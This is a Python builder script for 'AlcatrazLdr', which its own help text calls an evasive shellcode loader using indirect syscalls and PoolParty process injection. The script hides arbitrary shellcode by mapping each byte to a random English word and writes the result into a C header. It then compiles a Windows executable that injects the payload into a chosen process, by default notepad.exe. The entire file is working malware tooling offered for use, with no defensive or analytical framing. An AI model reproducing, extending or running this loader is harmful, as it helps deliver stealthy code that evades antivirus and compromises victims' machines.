from os import path
from stone_color.messages import *

import subprocess
import argparse
import random
import json
import os

__dir__ = path.dirname(__file__)

def list_to_c_array_str(l: list, varname = None) -> str:
    if varname is None:
        out = "{\n\t"
    else:
        out = "char* " + varname + "[] = {\n\t" 

    y = 0
    for i, b in enumerate(l):
        if y > 4:
            out += "\n\t"
            y = 0
        else: y += 1

        if i < len(l) - 1:
            out += f"\"{b}\", " 
        else: out += f"\"{b}\""

    return out + "\n};"

def shellcode_encoder(shellcode: bytes) -> tuple[list[str], list[str]]:
    shellcode_alphabet = []
    shellcode_encoded  = []

    # Read a dictionary of english words
    english_words = list(json.load(
        open(path.join(__dir__, "tools", "words_dictionary.json"), "r")
    ).keys())

    # Makes word alphabet. Convert hex values into a random words 
    while len(shellcode_alphabet) < 256:
        random_word = random.choice(english_words)

        if random_word not in shellcode_alphabet:
            shellcode_alphabet.append(random_word)

    # Converts shellcode bytes to words by alphabet random-words
    for b in shellcode:
        shellcode_encoded.append(shellcode_alphabet[b])

    return (shellcode_alphabet, shellcode_encoded)

def main(parser: argparse.ArgumentParser):
    args = parser.parse_args()

    os.environ["TARGET_PROCNAME"] = '\\"' + args.target_process + '\\"'

    if not args.quiet:
        for line in open(path.join(__dir__, "./ascii.txt"), "r").read().splitlines():
            printf(5 * " " + line, flush=True)
        printf("\n\n", flush=True)

    try:
        file_fd = open(args.file, "rb")
    except Exception as e:
        errorf(e)
        quit(1)

    infof("Encoding...")
    shellcode_alphabet, shellcode_encoded = shellcode_encoder(file_fd.read())
    cargo_fd = open(path.join(__dir__, "src", "shellcode", "cargo.h"), "w")

    # Writes the shellcode encoded into src/shellcode/cargo.h as array of `unsigned char`

    cargo_fd.write(
        "#ifndef CARGO_H\n#define CARGO_H\n"
        +
        "const " + list_to_c_array_str(shellcode_alphabet, "shellcode_alphabet") 
        +
        "\nconst " + list_to_c_array_str(shellcode_encoded, "shellcode_encoded")
        +
        "\n#endif"
    )

    cargo_fd.close()

    successf("Shellcode has been encoded and writed into 'src/shellcode/cargo.h'")

    # Building executable

    if args.debug:
        compile_cmd = ["make", "clean", "debug"]
    elif args.docker:
        docker_status_code = subprocess.run(["docker", "build", "-t", "alcatrazldr", "."], cwd=__dir__).returncode
        if docker_status_code != 0:
            errorf("AlcatrazLdr building has been failed")
            quit(1)
        compile_cmd = ["docker", "run", "--mount", f"type=bind,source={__dir__}/out,target=/alcatrazLdr/out", "--security-opt", "label:disable", "alcatrazldr"]
    else:
        compile_cmd = ["make", "clean", "all"]

    printf("=" * 40 + " Building AlcatrazLdr STARTED " + "=" * 40)
    make_status_code = subprocess.run(compile_cmd, cwd=__dir__).returncode
    printf("=" * 40 + " Building AlcatrazLdr ENDED " + "=" * 42)

    if make_status_code != 0:
        errorf("AlcatrazLdr building has been failed")
    else:
        successf("file has been saved into: 'out/alcatrazLdr.exe'")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog="AlcatrazLdr",
        description="Evasive shellcode loader with indirect syscalls, Thread name-calling allocation, PoolParty injection",
    )
    parser.add_argument("file", help="File to embed into the loader")
    parser.add_argument("--target-process", "-tp", help="Target process name to inject", default="notepad.exe")
    parser.add_argument("--quiet", "-q", help="No banner", action="store_true")
    parser.add_argument("--debug", "-d", help="Debug flag", action="store_true")
    parser.add_argument("--docker", "-dk", help="Docker flag", action="store_true")

    main(parser)
